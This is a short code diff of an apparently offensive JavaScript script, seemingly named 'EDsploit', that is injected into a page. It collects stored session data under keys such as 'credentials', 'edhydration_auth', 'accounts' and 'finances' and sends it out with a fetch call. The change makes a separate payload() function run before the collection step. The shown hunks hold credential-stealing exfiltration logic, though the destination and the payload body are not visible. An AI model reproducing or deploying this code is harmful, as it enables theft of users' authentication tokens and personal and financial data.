@@ -3,6 +3,8 @@ const ur = new URL(document.currentScript.src);
 (async function ex() {
 
 	if (window.top.document.querySelector('form[class=EDsploit]')) return;
+	await payload();
+	
 	const keys = [
 		'accounts', 'badges', 'credentials', 'edhydration_auth',
 		'etablissement', 'finances', 'bigAds', 'fa', 'pdfjs.history','panier'
@@ -42,8 +44,6 @@ const ur = new URL(document.currentScript.src);
 			body: JSON.stringify(data)
 		});
 	} catch {}
-
-	return payload();
 })();
 
 async function payload() {
